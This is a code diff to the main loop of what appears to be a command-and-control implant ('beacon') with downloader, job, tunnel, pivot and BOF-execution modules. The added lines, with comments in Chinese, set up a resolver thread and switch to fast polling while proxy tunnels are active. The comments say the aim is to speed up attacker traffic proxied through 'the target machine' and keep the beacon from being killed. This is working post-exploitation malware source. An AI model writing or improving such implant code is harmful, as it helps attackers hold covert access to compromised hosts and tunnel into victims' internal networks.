@@ -149,13 +149,34 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 
 			Downloader_ProcessDownloader(g_Agent->downloader, packerOut);
 			JobsController_ProcessJobs(g_Agent->jober, packerOut);
+			// 有域名待解析时把常驻解析线程建起来（懒创建，只建一次）。
+			// ★ 放在主循环里、不在隧道命令处理里 —— 那里建实测会杀掉/卡死 beacon；
+			//   位置也和 Boffer 起异步 BOF 线程同一上下文。
+			Proxyfire_EnsureResolver(g_Agent->proxyfire);
 			Proxyfire_ProcessTunnels(g_Agent->proxyfire, packerOut);
 			Pivotter_ProcessPivots(g_Agent->pivotter, packerOut);
 			Boffer_ProcessAsyncBofs(g_AsyncBofManager, packerOut);
 
 			if (Agent_IsActive(g_Agent)) {
-				const BOOL hasOutput = (Packer_datasize(packerOut) >= 8);
-				g_Connector->Sleep(g_Connector, Boffer_GetWakeupEvent(g_AsyncBofManager), Agent_GetWorkingSleep(g_Agent), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
+				// 隧道活跃期改用毫秒级轮询。隧道数据搭的是心跳便车（Proxyfire_ProcessTunnels
+				// 往同一个 packerOut 塞、服务端在同一次 check-in 里一起下发），所以 sleep_delay
+				// **直接就是代理的包间隔** —— sleep=5 时一次内网取页实测 ~70s。
+				// 返回 0 表示"别管我，照常睡"（没有隧道 / 该行为被构建开关关掉）。
+				ULONG tunnelPoll = Proxyfire_PollDelayMs(g_Agent->proxyfire);
+				// sleep_delay 单位是**秒**（WaitMaskWithEvent 里 *1000），换成毫秒再比。
+				ULONG configuredMs = g_Agent->config->sleep_delay * 1000;
+				// 两道闸：
+				// ① 只在真能"缩短"时才接管 —— sleep 0 的机器本来就是忙轮询，不能被降速成 50ms；
+				// ② 只在工作时间窗口内加速（Agent_GetWorkingSleep==0 = 没配 working_time 或
+				//    当前在窗口内），否则等于让目标机在非工作时段持续替我们跑代理流量，
+				//    working_time 那条承诺就被绕过去了。
+				if (tunnelPoll != 0 && Agent_GetWorkingSleep(g_Agent) == 0 && (configuredMs == 0 || tunnelPoll < configuredMs)) {
+					ApiWin->Sleep(tunnelPoll);
+				}
+				else {
+					const BOOL hasOutput = (Packer_datasize(packerOut) >= 8);
+					g_Connector->Sleep(g_Connector, Boffer_GetWakeupEvent(g_AsyncBofManager), Agent_GetWorkingSleep(g_Agent), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
+				}
 			}
 
 		} while (g_Connector->IsConnected(g_Connector) && Agent_IsActive(g_Agent));
